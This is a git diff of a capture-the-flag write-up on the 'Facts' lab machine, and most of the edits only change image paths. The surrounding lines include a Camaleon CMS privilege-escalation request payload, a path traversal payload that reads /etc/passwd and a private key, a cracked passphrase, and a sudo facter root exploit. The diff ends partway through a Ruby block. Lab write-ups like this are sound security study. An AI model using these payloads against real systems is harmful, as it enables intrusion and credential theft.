@@ -114,8 +114,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Site
 
-![](season_10/Facts/images/4.png)
 
+![](images/4.png)
 ## Directory enumeration
 
 #### Gobuster
@@ -126,15 +126,14 @@ gobuster dir -u 'http://facts.htb/' -w /usr/share/wordlists/dirbuster/directory-
 
 Found `/admin`
 
-![](season_10/Facts/images/5.png)
-
+![](images/5.png)
 #### Admin page
 
-![](season_10/Facts/images/6.png)
+![](images/6.png)
 
 Registered an account then i found this is `Camaleon Version 2.9.0`
 
-![](season_10/Facts/images/7.png)
+![](images/7.png)
 
 # Foothold
 
@@ -146,7 +145,7 @@ I found that `Camaleon CMS 2.9.0` has [CVE-2025-2304](https://sploitus.com/explo
 
 My role now is client
 
-![](season_10/Facts/images/8.png)
+![](images/8.png)
 
 In `burpsuite`, turn on intercept then use the `change password` function.
 
@@ -156,11 +155,11 @@ Then add this `payload` to request:
 &password=admin
 ```
 
-![](season_10/Facts/images/9.png)
+![](images/9.png)
 
 Forward it then reload the page, i got `Administrator privileged`
 
-![](season_10/Facts/images/10.png)
+![](images/10.png)
 
 ### # Camaleon CMS Path Traversal
 
@@ -174,17 +173,17 @@ I used this `payload`:
 /admin/media/download_private_file?file=../../../../etc/passwd
 ```
 
-![](season_10/Facts/images/11.png)
+![](images/11.png)
 
 It was easy finding `private key` of `trivia` user,
 
-![](season_10/Facts/images/2.png)
+![](images/2.png)
 
 ### Shell as `trivia`
 
 First, i cracked `trivia` private key passphrase.
 
-![[season_10/Facts/images/1.png]]
+![](images/1.png)
 
 it's `dragonballz`
 
@@ -201,7 +200,7 @@ ssh -i id_ed25519 trivia@facts.htb
 `trivia` can run `facter` as `sudo`
 
 
-![](season_10/Facts/images/12.png)
+![](images/12.png)
 
 ## /usr/bin/facter
 
@@ -225,7 +224,7 @@ Then run exploit
 sudo /usr/bin/facter --custom-dir=. x
 ```
 
-![](season_10/Facts/images/3.png)
+![](images/3.png)
 
 Modified to get root
 ```ruby
